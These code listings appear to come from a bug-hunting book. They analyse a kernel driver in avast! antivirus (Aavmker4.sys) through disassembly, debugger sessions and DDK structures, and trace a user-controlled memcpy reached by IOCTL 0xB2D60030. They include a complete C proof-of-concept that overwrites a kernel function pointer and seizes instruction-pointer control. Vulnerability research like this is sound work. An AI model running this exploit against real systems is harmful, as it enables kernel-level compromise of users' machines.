["```\n[..]\n.text:000105D2 ; const WCHAR aDeviceAavmker4\n`.text:000105D2 aDeviceAavmker4:                        ; DATA XREF: DriverEntry+12`\n`.text:000105D2                 unicode 0, <\\Device\\AavmKer4>,0`\n[..]\n.text:00010620 ; NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, →\nPUNICODE_STRING RegistryPath)\n.text:00010620                 public DriverEntry\n.text:00010620 DriverEntry     proc near\n.text:00010620\n.text:00010620 SymbolicLinkName= UNICODE_STRING ptr −14h\n.text:00010620 DestinationString= UNICODE_STRING ptr −0Ch\n.text:00010620 DeviceObject    = dword ptr −4\n.text:00010620 DriverObject    = dword ptr  8\n.text:00010620 RegistryPath    = dword ptr  0Ch\n.text:00010620\n.text:00010620                 push    ebp\n.text:00010621                 mov     ebp, esp\n.text:00010623                 sub     esp, 14h\n.text:00010626                 push    ebx\n.text:00010627                 push    esi\n.text:00010628                 mov     esi, ds:RtlInitUnicodeString\n.text:0001062E                 push    edi\n.text:0001062F                 lea     eax, [ebp+DestinationString]\n`.text:00010632                 push    offset aDeviceAavmker4 ; SourceString`\n.text:00010637                 push    eax             ; DestinationString\n.text:00010638                 call    esi ; RtlInitUnicodeString\n.text:0001063A                 mov     edi, [ebp+DriverObject]\n.text:0001063D                 lea     eax, [ebp+DeviceObject]\n.text:00010640                 xor     ebx, ebx\n.text:00010642                 push    eax             ; DeviceObject\n.text:00010643                 push    ebx             ; Exclusive\n.text:00010644                 push    ebx             ; DeviceCharacteristics\n.text:00010645                 lea     eax, [ebp+DestinationString]\n.text:00010648                 push    22h             ; DeviceType\n.text:0001064A                 push    eax             ; DeviceName\n.text:0001064B                 push    ebx             ; DeviceExtensionSize\n.text:0001064C                 push    edi             ; DriverObject\n`.text:0001064D                 call    ds:IoCreateDevice`\n.text:00010653                 cmp     eax, ebx\n.text:00010655                 jl      loc_1075E\n[..]\n```", "```\n[..]\nRtlInitUnicodeString (&DestinationString, &L\"\\\\Device\\\\AavmKer4\");\nretval = IoCreateDevice (DriverObject, 0, &DestinationString,\n 0x22, 0, 0, &DeviceObject);\n[..]\n```", "```\n[..]\ntypedef struct _DRIVER_OBJECT {\n    CSHORT Type;\n    CSHORT Size;\n    PDEVICE_OBJECT DeviceObject;\n    ULONG Flags;\n    PVOID DriverStart;\n    ULONG DriverSize;\n    PVOID DriverSection;\n    PDRIVER_EXTENSION DriverExtension;\n    UNICODE_STRING DriverName;\n    PUNICODE_STRING HardwareDatabase;\n    PFAST_IO_DISPATCH FastIoDispatch;\n    PDRIVER_INITIALIZE DriverInit;\n    PDRIVER_STARTIO DriverStartIo;\n    PDRIVER_UNLOAD DriverUnload;\n    `PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];`\n} DRIVER_OBJECT;\n[..]\n```", "```\n[..]\n#define IRP_MJ_CREATE                   0x00\n#define IRP_MJ_CREATE_NAMED_PIPE        0x01\n#define IRP_MJ_CLOSE                    0x02\n#define IRP_MJ_READ                     0x03\n#define IRP_MJ_WRITE                    0x04\n#define IRP_MJ_QUERY_INFORMATION        0x05\n#define IRP_MJ_SET_INFORMATION          0x06\n#define IRP_MJ_QUERY_EA                 0x07\n#define IRP_MJ_SET_EA                   0x08\n#define IRP_MJ_FLUSH_BUFFERS            0x09\n#define IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a\n#define IRP_MJ_SET_VOLUME_INFORMATION   0x0b\n#define IRP_MJ_DIRECTORY_CONTROL        0x0c\n#define IRP_MJ_FILE_SYSTEM_CONTROL      0x0d\n`#define IRP_MJ_DEVICE_CONTROL           0x0e`\n#define IRP_MJ_INTERNAL_DEVICE_CONTROL  0x0f\n#define IRP_MJ_SHUTDOWN                 0x10\n#define IRP_MJ_LOCK_CONTROL             0x11\n#define IRP_MJ_CLEANUP                  0x12\n#define IRP_MJ_CREATE_MAILSLOT          0x13\n#define IRP_MJ_QUERY_SECURITY           0x14\n#define IRP_MJ_SET_SECURITY             0x15\n#define IRP_MJ_POWER                    0x16\n#define IRP_MJ_SYSTEM_CONTROL           0x17\n#define IRP_MJ_DEVICE_CHANGE            0x18\n#define IRP_MJ_QUERY_QUOTA              0x19\n#define IRP_MJ_SET_QUOTA                0x1a\n#define IRP_MJ_PNP                      0x1b\n#define IRP_MJ_PNP_POWER                IRP_MJ_PNP     // Obsolete....\n#define IRP_MJ_MAXIMUM_FUNCTION         0x1b\n[..]\n```", "```\nDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTL_dispatch_routine;\n```", "```\nkd> `.sympath SRV*c:\\WinDBGSymbols*http://msdl.microsoft.com/download/symbols`\nkd> `.reload`\n[..]\nkd> `dt -v _DRIVER_OBJECT .`\nnt!_DRIVER_OBJECT\nstruct _DRIVER_OBJECT, 15 elements, 0xa8 bytes\n   +0x000 Type             : Int2B\n   +0x002 Size             : Int2B\n   +0x004 DeviceObject     :\n   +0x008 Flags            : Uint4B\n   +0x00c DriverStart      :\n   +0x010 DriverSize       : Uint4B\n   +0x014 DriverSection    :\n   +0x018 DriverExtension  :\n   +0x01c DriverName       : struct _UNICODE_STRING, 3 elements, 0x8 bytes\n      +0x000 Length           : Uint2B\n      +0x002 MaximumLength    : Uint2B\n      +0x004 Buffer           : Ptr32 to Uint2B\n   +0x024 HardwareDatabase :\n   +0x028 FastIoDispatch   :\n   +0x02c DriverInit       :\n   +0x030 DriverStartIo    :\n   +0x034 DriverUnload     :\n   `+0x038 MajorFunction    : [28]`\n```", "```\nIn C: DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTL_dispatch_routine;\nOffsets         : DriverObject   +   0x38  +  0x0e * 4   = IOCTL_dispatch_routine;\nSimplified form : DriverObject   +   0x70                = IOCTL_dispatch_routine;\n```", "```\n[..]\n.text:00010748                 mov     eax, [ebp+DriverObject]\n[..]\n.text:00010750                 mov     dword ptr [eax+70h], offset sub_1098C\n[..]\n```", "```\nAssignment in C: DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = sub_1098c;\nOffsets        : DriverObject + 0x70                                = sub_1098c;\n```", "```\nkd> `!drvobj AavmKer4 7`\nDriver object (86444f38) is for:\n*** ERROR: Symbol file could not be found.  Defaulted to export\n symbols for Aavmker4.SYS -\n \\Driver\\Aavmker4\nDriver Extension List: (id , addr)\n\nDevice Object list:\n863a9150\n\nDriverEntry:   f792d620 Aavmker4\nDriverStartIo: 00000000\nDriverUnload:  00000000\nAddDevice:     00000000\n\nDispatch routines:\n[00] IRP_MJ_CREATE                      f792d766         Aavmker4+0x766\n[01] IRP_MJ_CREATE_NAMED_PIPE           f792d766         Aavmker4+0x766\n[02] IRP_MJ_CLOSE                       f792d766         Aavmker4+0x766\n[03] IRP_MJ_READ                        f792d766         Aavmker4+0x766\n[04] IRP_MJ_WRITE                       f792d766         Aavmker4+0x766\n[05] IRP_MJ_QUERY_INFORMATION           f792d766         Aavmker4+0x766\n[06] IRP_MJ_SET_INFORMATION             f792d766         Aavmker4+0x766\n[07] IRP_MJ_QUERY_EA                    f792d766         Aavmker4+0x766\n[08] IRP_MJ_SET_EA                      f792d766         Aavmker4+0x766\n[09] IRP_MJ_FLUSH_BUFFERS               f792d766         Aavmker4+0x766\n[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    f792d766         Aavmker4+0x766\n[0b] IRP_MJ_SET_VOLUME_INFORMATION      f792d766         Aavmker4+0x766\n[0c] IRP_MJ_DIRECTORY_CONTROL           f792d766         Aavmker4+0x766\n[0d] IRP_MJ_FILE_SYSTEM_CONTROL         f792d766         Aavmker4+0x766\n`[0e] IRP_MJ_DEVICE_CONTROL              f792d98c         Aavmker4+0x98c`\n[..]\n```", "```\nNTSTATUS\n  DispatchDeviceControl(\n    __in struct _DEVICE_OBJECT  *DeviceObject,\n    __in struct _IRP  *Irp\n    )\n  { ... }\n```", "```\n[..]\n.text:0001098C ; int __stdcall sub_1098C(int, PIRP Irp)\n.text:0001098C sub_1098C       proc near               ; DATA XREF: DriverEntry+130\n[..]\n`.text:000109B2                 mov     ebx, [ebp+Irp]  ; ebx = address of IRP`\n`.text:000109B5                 mov     eax, [ebx+60h]`\n[..]\n```", "```\nkd> `dt -v -r 3 _IRP`\nnt!_IRP\nstruct _IRP, 21 elements, 0x70 bytes\n  +0x000 Type             : ??\n  +0x002 Size             : ??\n  +0x004 MdlAddress       : ????\n  +0x008 Flags            : ??\n[..]\n  `+0x040 Tail             : union __unnamed, 3 elements, 0x30 bytes`\n     +0x000 Overlay          : struct __unnamed, 8 elements, 0x28 bytes\n        +0x000 DeviceQueueEntry : struct _KDEVICE_QUEUE_ENTRY, 3 elements, 0x10 bytes\n        +0x000 DriverContext    : [4] ????\n        +0x010 Thread           : ????\n        +0x014 AuxiliaryBuffer  : ????\n        +0x018 ListEntry        : struct _LIST_ENTRY, 2 elements, 0x8 bytes\n        `+0x020 CurrentStackLocation : ????`\n[..]\n```", "```\n[..]\n//\n// I/O Request Packet (IRP) definition\n//\ntypedef struct _IRP {\n[..]\n        `//`\n        `// Current stack location - contains a pointer to the current`\n        `// IO_STACK_LOCATION structure in the IRP stack.  This field`\n        `// should never be directly accessed by drivers.  They should`\n        `// use the standard functions.`\n        `//`\n\n        `struct _IO_STACK_LOCATION *CurrentStackLocation;`\n[..]\n```", "```\n[..]\n`typedef struct _IO_STACK_LOCATION {`\n    UCHAR MajorFunction;\n    UCHAR MinorFunction;\n    UCHAR Flags;\n    UCHAR Control;\n[..]\n        //\n        // System service parameters for:  NtDeviceIoControlFile\n        //\n        // Note that the user's output buffer is stored in the\n        // UserBuffer field\n        // and the user's input buffer is stored in the SystemBuffer\n        // field.\n        //\n\n        struct {\n            `ULONG OutputBufferLength;`\n            `ULONG POINTER_ALIGNMENT InputBufferLength;`\n            `ULONG POINTER_ALIGNMENT IoControlCode;`\n            PVOID Type3InputBuffer;\n        } DeviceIoControl;\n[..]\n```", "```\n[..]\n.text:0001098C ; int __stdcall sub_1098C(int, PIRP Irp)\n.text:0001098C sub_1098C     proc near               ; DATA XREF: DriverEntry+130\n[..]\n.text:000109B2        mov    ebx, [ebp+Irp]  ; ebx = address of IRP\n`.text:000109B5        mov    eax, [ebx+60h]  ; eax = address of CurrentStackLocation`\n`.text:000109B8        mov    esi, [eax+8]    ; ULONG InputBufferLength`\n.text:000109BB        mov    [ebp+var_1C], esi ; save InputBufferLength in var_1C\n`.text:000109BE        mov    edx, [eax+4]    ; ULONG OutputBufferLength`\n.text:000109C1        mov    [ebp+var_3C], edx ; save OutputBufferLength in var_3C\n`.text:000109C4        mov    eax, [eax+0Ch]  ; ULONG IoControlCode`\n`.text:000109C7        mov    ecx, 0B2D6002Ch ; ecx = 0xB2D6002C`\n`.text:000109CC        cmp    eax, ecx        ; compare 0xB2D6002C with IoControlCode`\n.text:000109CE        ja     loc_10D15\n[..]\n```", "```\n[..]\n//\n// Macro definition for defining IOCTL and FSCTL function control codes.  Note\n// that function codes 0-2047 are reserved for Microsoft Corporation, and\n// 2048-4095 are reserved for customers.\n//\n\n`#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \\`\n    `((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \\`\n`)`\n\n[..]\n\n//\n// Define the method codes for how buffers are passed for I/O and FS controls\n//\n\n#define METHOD_BUFFERED                 0\n#define METHOD_IN_DIRECT                1\n#define METHOD_OUT_DIRECT               2\n#define METHOD_NEITHER                  3\n[..]\n```", "```\n01    #include <windows.h>\n02    #include <stdio.h>\n03\n04    int\n05    main (int argc, char *argv[])\n06    {\n07        unsigned int  method  = 0;\n08        unsigned int  code    = 0;\n09\n10        if (argc != 2) {\n11           fprintf (stderr, \"Usage: %s <IOCTL code>\\n\", argv[0]);\n12           return 1;\n13        }\n14\n15        code = strtoul (argv[1], (char **) NULL, 16);\n16        method = code & 3;\n17\n18        switch (method) {\n19           case 0:\n20              printf (\"METHOD_BUFFERED\\n\");\n21              break;\n22           case 1:\n23              printf (\"METHOD_IN_DIRECT\\n\");\n24              break;\n25           case 2:\n26              printf (\"METHOD_OUT_DIRECT\\n\");\n27              break;\n28           case 3:\n29              printf (\"METHOD_NEITHER\\n\");\n30              break;\n31           default:\n32              fprintf (stderr, \"ERROR: invalid IOCTL data transfer method\\n\");\n33              break;\n34        }\n35\n36        return 0;\n37    }\n```", "```\nC:\\BHD>`cl /nologo IOCTL_method.c`\nIOCTL_method.c\n```", "```\nC:\\BHD>`IOCTL_method.exe B2D6002C`\nMETHOD_BUFFERED\n```", "```\n[..]\n.text:00010CF1                 mov     eax, [ebx+0Ch]  ; ebx = address of IRP\n.text:00010CF4                 mov     eax, [eax]\n[..]\n```", "```\nkd> `dt -v -r 2 _IRP`\nnt!_IRP\nstruct _IRP, 21 elements, 0x70 bytes\n   +0x000 Type             : ??\n   +0x002 Size             : ??\n   +0x004 MdlAddress       : ????\n   +0x008 Flags            : ??\n   `+0x00c AssociatedIrp    : union __unnamed, 3 elements, 0x4 bytes`\n      +0x000 MasterIrp        : ????\n      +0x000 IrpCount         : ??\n      `+0x000 SystemBuffer     : ????`\n[..]\n```", "```\n[..]\n.text:0001098C ; int __stdcall sub_1098C(int, PIRP Irp)\n.text:0001098C sub_1098C       proc near               ; DATA XREF: DriverEntry+130\n[..]\n`.text:00010D28                 cmp     eax, 0B2D60030h ; IOCTL-Code == 0xB2D60030 ?`\n.text:00010D2D                 jz      short loc_10DAB ; if so -> loc_10DAB\n[..]\n```", "```\n[..]\n.text:000109B8            mov   esi, [eax+8]       ; ULONG InputBufferLength\n`.text:000109BB            mov   [ebp+var_1C], esi`\n[..]\n.text:00010DAB loc_10DAB:                          ; CODE XREF: sub_1098C+3A1\n`.text:00010DAB            xor   edi, edi           ; EDI = 0`\n.text:00010DAD            cmp   byte_1240C, 0\n.text:00010DB4            jz    short loc_10DC9\n[..]\n.text:00010DC9 loc_10DC9:                          ; CODE XREF: sub_1098C+428\n`.text:00010DC9            mov   esi, [ebx+0Ch]     ; Irp->AssociatedIrp.SystemBuffer`\n`.text:00010DCC            cmp   [ebp+var_1C], 878h ; input data length == 0x878 ?`\n.text:00010DD3            jz    short loc_10DDF    ; if so -> loc_10DDF\n[..]\n```", "```\n[..]\n.text:00010DDF loc_10DDF:                     ; CODE XREF: sub_1098C+447\n.text:00010DDF        mov   [ebp+var_4], edi\n`.text:00010DE2        cmp   [esi], edi        ; ESI == input data`\n.text:00010DE4        jz    short loc_10E34   ; if input data == NULL -> loc_10E34\n[..]\n`.text:00010DE6        mov   eax, [esi+870h]   ; ESI and EAX`\n `are pointing to the →`\n                                                `input data`\n`.text:00010DEC        mov   [ebp+var_48], eax ; a pointer to user controlled data →`\n                                                `is stored in var_48`\n`.text:00010DEF        cmp   dword ptr [eax], 0D0DEAD07h  ; validation of input data`\n.text:00010DF5        jnz   short loc_10E00\n[..]\n`.text:00010DF7        cmp   dword ptr [eax+4], 10BAD0BAh ; validation of input data`\n.text:00010DFE        jz    short loc_10E06\n[..]\n```", "```\n[..]\n.text:00010E06 loc_10E06:                              ; CODE XREF: sub_1098C+472\n.text:00010E06                 xor     edx, edx\n.text:00010E08                 mov     eax, [ebp+var_48]\n.text:00010E0B                 mov     [eax], edx\n.text:00010E0D                 mov     [eax+4], edx\n`.text:00010E10                 add     esi, 4         ; source address`\n`.text:00010E13                 mov     ecx, 21Ah      ; length`\n`.text:00010E18                 mov     edi, [eax+18h] ; destination address`\n`.text:00010E1B                 rep movsd              ; memcpy()`\n[..]\n```", "```\nmemcpy ([EAX+0x18], ESI + 4, 0x21a * 4);\n```", "```\nmemcpy (user_controlled_address, user_controlled_data, 0x868);\n```", "```\n[..]\n.text:00010D8F            push    2               ; _DWORD\n.text:00010D91            push    1               ; _DWORD\n.text:00010D93            push    1               ; _DWORD\n.text:00010D95            push    dword ptr [eax] ; _DWORD\n.text:00010D97            call    KeGetCurrentThread\n.text:00010D9C            push    eax             ; _DWORD\n`.text:00010D9D            call    dword_12460     ; the function pointer is called`\n.text:00010DA3            mov     [ebx+18h], eax\n.text:00010DA6            jmp     loc_10F04\n[..]\n.text:00010DB6            push    2               ; _DWORD\n.text:00010DB8            push    1               ; _DWORD\n.text:00010DBA            push    1               ; _DWORD\n.text:00010DBC            push    edi             ; _DWORD\n.text:00010DBD            call    KeGetCurrentThread\n.text:00010DC2            push    eax             ; _DWORD\n`.text:00010DC3            call    dword_12460     ; the function pointer is called`\n[..]\n`.data:00012460 ; int (__stdcall *dword_12460)(_DWORD,`\n `_DWORD, _DWORD, _DWORD, _DWORD)`\n`.data:00012460 dword_12460     dd 0               ; the function pointer is declared`\n[..]\n```", "```\n01    #include <windows.h>\n 02    #include <winioctl.h>\n 03    #include <stdio.h>\n 04    #include <psapi.h>\n 05\n 06    #define IOCTL            0xB2D60030  // vulnerable IOCTL\n 07    #define INPUTBUFFER_SIZE 0x878       // input data length\n 08\n 09    __inline void\n 10    memset32 (void* dest, unsigned int fill, unsigned int count)\n 11    {\n 12     if (count > 0) {\n 13       _asm {\n 14         mov   eax, fill   // pattern\n 15         mov   ecx, count  // count\n 16         mov   edi, dest   // dest\n 17         rep   stosd;\n 18       }\n 19     }\n 20    }\n 21\n 22    unsigned int\n 23    GetDriverLoadAddress (char *drivername)\n 24    {\n 25     LPVOID        drivers[1024];\n 26     DWORD         cbNeeded  = 0;\n 27     int           cDrivers  = 0;\n 28     int           i         = 0;\n 29     const char *  ptr       = NULL;\n 30     unsigned int  addr      = 0;\n 31\n 32     if (EnumDeviceDrivers (drivers, sizeof (drivers), &cbNeeded) &&\n 33                            cbNeeded < sizeof (drivers)) {\n 34       char szDriver[1024];\n 35\n 36       cDrivers = cbNeeded / sizeof (drivers[0]);\n 37\n 38       for (i = 0; i < cDrivers; i++) {\n 39         if (GetDeviceDriverBaseName (drivers[i], szDriver,\n 40                                      sizeof (szDriver) / sizeof (szDriver[0]))) {\n 41           if (!strncmp (szDriver, drivername, 8)) {\n 42             printf (\"%s (%08x)\\n\", szDriver, drivers[i]);\n 43             return (unsigned int)(drivers[i]);\n 44           }\n 45         }\n 46       }\n 47     }\n 48\n 49     fprintf (stderr, \"ERROR: cannot get address of driver %s\\n\", drivername);\n 50\n 51     return 0;\n 52    }\n 53\n 54    int\n 55    main (void)\n 56    {\n 57      HANDLE        hDevice;\n 58      char *        InputBuffer       = NULL;\n 59      BOOL          retval            = TRUE;\n 60      unsigned int  driveraddr        = 0;\n 61      unsigned int  pattern1          = 0xD0DEAD07;\n 62      unsigned int  pattern2          = 0x10BAD0BA;\n 63      unsigned int  addr_to_overwrite = 0;      // address to overwrite\n 64      char          data[2048];\n 65\n 66      // get the base address of the driver\n 67      if (!(driveraddr = GetDriverLoadAddress (\"Aavmker4\"))) {\n 68        return 1;\n 69      }\n 70\n 71      // address of the function pointer at .data:00012460 that gets overwritten\n 72      addr_to_overwrite = driveraddr + 0x2460;\n 73\n 74      // allocate InputBuffer\n 75      InputBuffer = (char *)VirtualAlloc ((LPVOID)0,\n 76                        INPUTBUFFER_SIZE,\n 77                        MEM_COMMIT | MEM_RESERVE,\n 78                        PAGE_EXECUTE_READWRITE);\n 79\n 80      /////////////////////////////////////////////////////////////////////////////\n 81      // InputBuffer data:\n 82      //\n 83      // .text:00010DC9  mov esi, [ebx+0Ch]  ; ESI == InputBuffer\n 84\n 85      // fill InputBuffer with As\n 86      memset (InputBuffer, 0x41, INPUTBUFFER_SIZE);\n 87\n 88      // .text:00010DE6  mov eax, [esi+870h] ; EAX == pointer to \"data\"\n 89      memset32 (InputBuffer + 0x870, (unsigned int)&data, 1);\n 90\n 91      /////////////////////////////////////////////////////////////////////////////\n 92      // data:\n 93      //\n 94\n 95      // As the \"data\" buffer is used as a parameter for a\n \"KeSetEvent\" windows kernel\n 96      // function, it needs to contain some valid pointers\n (.text:00010E2C call ds:KeSetEvent)\n 97      memset32 (data, (unsigned int)&data, sizeof (data) / sizeof (unsigned int));\n 98\n 99      // .text:00010DEF  cmp dword ptr [eax], 0D0DEAD07h ; EAX == pointer to \"data\"\n100      memset32 (data, pattern1, 1);\n101\n102      // .text:00010DF7  cmp dword ptr [eax+4], 10BAD0BAh ; EAX\n == pointer to \"data\"\n103      memset32 (data + 4, pattern2, 1);\n104\n105      // .text:00010E18 mov edi, [eax+18h] ; EAX == pointer to \"data\"\n106      memset32 (data + 0x18, addr_to_overwrite, 1);\n107\n108      /////////////////////////////////////////////////////////////////////////////\n109      // open device\n110      hDevice = CreateFile (TEXT(\"\\\\\\\\.\\\\AavmKer4\"),\n111                  GENERIC_READ | GENERIC_WRITE,\n112                  FILE_SHARE_READ | FILE_SHARE_WRITE,\n113                  NULL,\n114                  OPEN_EXISTING,\n115                  0,\n116                  NULL);\n117\n118      if (hDevice != INVALID_HANDLE_VALUE) {\n119        DWORD retlen = 0;\n120\n121        // send evil IOCTL request\n122        retval = DeviceIoControl (hDevice,\n123                      IOCTL,\n124                      (LPVOID)InputBuffer,\n125                      INPUTBUFFER_SIZE,\n126                      (LPVOID)NULL,\n127                      0,\n128                      &retlen,\n129                      NULL);\n130\n131        if (!retval) {\n132          fprintf (stderr, \"[-] Error: DeviceIoControl failed\\n\");\n133        }\n134\n135      } else {\n136        fprintf (stderr, \"[-] Error: Unable to open device.\\n\");\n137      }\n138\n139      return (0);\n140    }\n```", "```\n[..]\n.text:00010E10                 add     esi, 4          ; source address\n.text:00010E13                 mov     ecx, 21Ah       ; length\n.text:00010E18                 mov     edi, [eax+18h]  ; destination address\n.text:00010E1B                 rep movsd               ; memcpy()\n.text:00010E1D                 dec     PendingCount2\n.text:00010E23                 inc     dword ptr [eax+20h]\n.text:00010E26                 push    edx             ; Wait\n.text:00010E27                 push    edx             ; Increment\n.text:00010E28                 add     eax, 8\n`.text:00010E2B                 push    eax             ; Parameter of KeSetEvent`\n`.text:00010E2B                                         ; (eax = IOCTL input data)`\n`.text:00010E2C                 call    ds:KeSetEvent   ; KeSetEvent is called`\n.text:00010E32                 xor     edi, edi\n[..]\n```", "```\nkd> `.sympath SRV*c:\\WinDBGSymbols*http://msdl.microsoft.com/download/symbols`\nkd> `.reload`\n[..]\nkd> `g`\nBreak instruction exception - code 80000003 (first chance)\n*******************************************************************************\n*                                                                             *\n*   You are seeing this message because you pressed either                    *\n*       CTRL+C (if you run kd.exe) or,                                        *\n*       CTRL+BREAK (if you run WinDBG),                                       *\n*   on your debugger machine's keyboard.                                      *\n*                                                                             *\n*                   THIS IS NOT A BUG OR A SYSTEM CRASH                       *\n*                                                                             *\n* If you did not intend to break into the debugger, press the \"g\" key, then   *\n* press the \"Enter\" key now.  This message might immediately reappear.  If it *\n* does, press \"g\" and \"Enter\" again.                                          *\n*                                                                             *\n*******************************************************************************\nnt!RtlpBreakWithStatusInstruction:\n80527bdc cc              int     3\n\nkd> `g`\n```", "```\nC:\\BHD\\avast>`cl /nologo poc.c psapi.lib`\nC:\\BHD\\avast>`poc.exe`\n```", "```\n#################### AAVMKER: WRONG RQ ######################!\nAccess violation - code c0000005 (!!! second chance !!!)\n                     41414141 ??                ???\n```", "```\nkd> `kb`\nChildEBP RetAddr  Args to Child\nWARNING: Frame IP not in any known module. Following frames may be wrong.\n`ee91abc0 f7925da3 862026a8 e1cd33a8 00000001 0x41414141`\nee91ac34 804ee119 86164030 860756b8 806d22d0 Aavmker4+0xda3\nee91ac44 80574d5e 86075728 861494e8 860756b8 nt!IopfCallDriver+0x31\nee91ac58 80575bff 86164030 860756b8 861494e8 nt!IopSynchronousServiceTail+0x70\nee91ad00 8056e46c 0000011c 00000000 00000000 nt!IopXxxControlFile+0x5e7\nee91ad34 8053d638 0000011c 00000000 00000000 nt!NtDeviceIoControlFile+0x2a\nee91ad34 7c90e4f4 0000011c 00000000 00000000 nt!KiFastCallEntry+0xf8\n0184c4d4 650052be 0000011c b2d60034 0184ff74 0x7c90e4f4\n0184ffb4 7c80b713 0016d2a0 00150000 0016bd90 0x650052be\n0184ffec 00000000 65004f98 0016d2a0 00000000 0x7c80b713\n\nkd> `r`\neax=862026a8 ebx=860756b8 ecx=b2d6005b edx=00000000 esi=00000008 edi=861494e8\n`eip=41414141` esp=ee91abc4 ebp=ee91ac34 iopl=0         nv up ei pl nz na po nc\ncs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202\n41414141 ??              ???\n```"]